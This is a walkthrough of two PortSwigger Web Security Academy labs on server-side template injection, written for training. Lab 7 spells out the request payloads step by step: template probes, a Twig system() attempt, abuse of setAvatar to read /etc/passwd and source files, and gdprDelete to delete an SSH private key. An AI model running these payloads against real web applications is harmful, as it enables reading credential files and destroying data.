## Labs Covered

This write-up focuses on the following **EXPERT-level labs** from the PortSwigger Web Security Academy related to **Server-side template injection (SSTI)**:

**Server-side template injection in a sandboxed environment**  
This lab demonstrates how attackers can bypass template engine sandbox restrictions to achieve code execution.

**Server-side template injection with a custom exploit**  
This lab shows how attackers can craft custom payloads to exploit SSTI in non-standard or custom template engine implementations.

---

### LAB 6 - Server-side template injection in a sandboxed environment

### Lab Description

<img width="753" height="380" alt="image" src="https://github.com/user-attachments/assets/e7e85cf9-05c0-4923-b247-0dfe11827359" />

### Solution

Now give random objection instance of price  I give it king and give me error which will reveal template being used so **freemarker java**.


<img width="922" height="555" alt="image" src="https://github.com/user-attachments/assets/c1c4e463-4e94-444a-9d51-4a1f10c27a54" />

We execute 2 payload and get 49

<img width="790" height="455" alt="image" src="https://github.com/user-attachments/assets/64732614-1716-42e3-9927-4c4559466e6d" />


And get 9

<img width="641" height="358" alt="image" src="https://github.com/user-attachments/assets/b07a2073-ab81-43ef-9683-0c618507218d" />

Now when we used payload to bypass sandbox it is giving me below error which says article is not defined.

<img width="1353" height="629" alt="image" src="https://github.com/user-attachments/assets/da263767-a6fb-4fb1-bbb4-f3b2e4a9de4e" />

So we will used product because product is object in it.


<img width="1449" height="381" alt="image" src="https://github.com/user-attachments/assets/32531546-1d93-4212-9813-1f91bbbe9ad3" />

At bottom we can see the result of **my_password.txt. And the submit ty00vv4k6u5keypnia1a** and lab is solved

<img width="1153" height="374" alt="image" src="https://github.com/user-attachments/assets/707e000b-d377-42e6-8ba9-690c7fbfedfa" />

---
### LAB 7 - Server-side template injection with a custom exploit

### Lab Description

<img width="770" height="472" alt="image" src="https://github.com/user-attachments/assets/3580c404-d0b7-4d28-8a76-bc2b8352677c" />

### Solution

## Solution 1: My Solution

This lab was pretty cool and enjoyable. It took me a few days to solve it because initially, I went in the wrong direction by focusing too much on the Twig documentation. Although studying template engine documentation is often necessary for real-world exploitation (e.g., learning about custom templates, extensions, filters, gadgets for RCE or file read), in this case, it was not the right path.

I tried creating and uploading custom Twig templates, extensions, and filters using the avatar upload functionality. I even attempted uploading custom PHP files, but none of these methods worked due to Twig's security hardening. Eventually, I realized I needed to focus on developer-created objects exposed in the templates.

### Tip from Web Security Academy

> Some template engines run in a secure, locked-down environment. While this makes RCE harder, developer-created objects may expose an easier attack surface.

So, we look for those developer-created objects. That's tip #1.

### Initial Observation

1. Log in as the `wiener` user and intercept requests using Burp.
2. Navigate to the "My account" page.
3. Notice the parameter `blog-post-author-display=user.first_name` when choosing a "Preferred name."

   <img width="764" height="200" alt="image" src="https://github.com/user-attachments/assets/2bdaa6a1-501b-4ffd-a28a-24e0ab24f8a0" />

<img width="1049" height="108" alt="image" src="https://github.com/user-attachments/assets/58e5a3ba-2bff-4933-abcf-374dda3478c9" />

<img width="1049" height="108" alt="image" src="https://github.com/user-attachments/assets/a22bb855-4501-4d76-9aba-b32431052388" />


4. Also post a comment. Observe that your preferred name is reflected as the comment author.

   <img width="780" height="579" alt="image" src="https://github.com/user-attachments/assets/bb7db252-2790-46b8-beec-3edbcaedad3c" />


### Test for SSTI

Send a modified POST request via Burp Repeater:

```text
blog-post-author-display=user.first_name${{<%[%'"}}
```

<img width="1012" height="589" alt="image" src="https://github.com/user-attachments/assets/a7e20031-a424-4c1e-9c85-4999bfe201ca" />

<img width="1329" height="118" alt="image" src="https://github.com/user-attachments/assets/e08b1665-24bc-4709-a48e-b2fdf50698db" />

This triggers an error — confirming a Twig-based SSTI.

Now test a basic Twig operation:

```text
blog-post-author-display=user.first_name}}{{7*7
```

Result: `49` is rendered in the comment author. Confirmed template evaluation.


<img width="1015" height="489" alt="image" src="https://github.com/user-attachments/assets/cf0a5418-09da-42a8-8164-680603b1d051" />

### Trying Common Payloads

Try:

```twig
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{['id']|filter('system')}}
```

None of these resulted in code execution. So, still template injection, but no direct RCE.

### Exploring Avatar Upload

Try uploading invalid file types (e.g., no file or a PHP file) — observe the error messages:

* References to `User.php`
* Reference to method `user.setAvatar()`

  <img width="823" height="203" alt="image" src="https://github.com/user-attachments/assets/7dda63a2-34cf-43c0-9631-4aaa51a54809" />

  <img width="902" height="126" alt="image" src="https://github.com/user-attachments/assets/3b36f1ca-3f4c-46ee-b2ee-db5015b001b3" />


<img width="1192" height="109" alt="image" src="https://github.com/user-attachments/assets/7306d270-b189-465c-965d-b1f2696b7485" />

Try executing that method:

```text
blog-post-author-display=user.setAvatar()
```

<img width="1207" height="261" alt="image" src="https://github.com/user-attachments/assets/040d13fc-9aaa-4b47-9ad9-4b5600a1903c" />

Error confirms that the method exists and can be triggered.

### Reading Sensitive Files

You must pass two parameters to `setAvatar`: filepath and MIME type.

Try:

```text
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')
```

Refresh the comment — the avatar image becomes a symlink to the PHP file.
Open image in new tab → get the PHP source code.

<img width="1193" height="268" alt="image" src="https://github.com/user-attachments/assets/cbe95b28-1780-436e-8cec-e7cbec4d2c47" />

<img width="838" height="113" alt="image" src="https://github.com/user-attachments/assets/53a2e48f-5fbe-4282-921c-d4b4b8fb548c" />


Repeat for:

```text
blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php','image/jpeg')
```

<img width="984" height="680" alt="image" src="https://github.com/user-attachments/assets/6033c6a8-ea79-45b5-9b0a-1c8364f77d66" />
	Nothing to see here :)



### Finding the `gdprDelete()` Method

Discovered in `User.php`:

```php
public function gdprDelete() {
    $this->rm(readlink($this->avatarLink));
    $this->rm($this->avatarLink);
    $this->delete();
}
```

<img width="1902" height="237" alt="image" src="https://github.com/user-attachments/assets/876ab927-1cf4-4642-99f0-e112c4e8fd23" />

<img width="1688" height="666" alt="image" src="https://github.com/user-attachments/assets/7f33ef7a-2ff5-4f9b-b3b2-9f57349bc224" />

	Nothing to see here :)



### Final Exploit - Delete Sensitive File

1. Set symlink to sensitive file:

```text
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')
```


<img width="1907" height="229" alt="image" src="https://github.com/user-attachments/assets/6ba5f03e-c6dd-40a2-90f9-146758569946" />


<img width="1907" height="229" alt="image" src="https://github.com/user-attachments/assets/6ba5f03e-c6dd-40a2-90f9-146758569946" />

2. Execute the deletion:

```text
blog-post-author-display=user.gdprDelete()
```

Result: The file is deleted and lab is solved!

<img width="1902" height="237" alt="image" src="https://github.com/user-attachments/assets/96d7f18a-0fdc-45cb-8683-2732749305db" />

We send this request and refresh the post page that we had commented on to execute the payload and booom! The `/home/carlos/.ssh/id_rsa` file is deleted and the lab is solved!



<img width="1688" height="666" alt="image" src="https://github.com/user-attachments/assets/23764d93-0df5-4bd6-9dfb-9da6c41c9f21" />

### Warning

Don't run:

```text
user.setAvatar('/home/carlos/User.php','image/jpeg')
user.gdprDelete()
```

It will break the lab and force a 20-minute reset.

---

## Solution 2: Web Security Academy’s Solution

1. Proxy traffic and log in. Post a comment.
2. Notice that the preferred name feature is vulnerable to SSTI.
3. Upload an invalid avatar. Observe error message exposing `user.setAvatar()` and `/home/carlos/User.php`.
4. Upload a valid image and comment again.
5. Use:

```text
user.setAvatar('/etc/passwd')
```

6. Error requires MIME type:

```text
user.setAvatar('/etc/passwd','image/jpg')
```

7. View the avatar at `/avatar?avatar=wiener` — confirms file read.
8. Read:

```text
user.setAvatar('/home/carlos/User.php','image/jpg')
```

9. Find `gdprDelete()` in the PHP file.
10. Set target file:

```text
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

11. Execute delete:

```text
user.gdprDelete()
```

Lab solved.


---
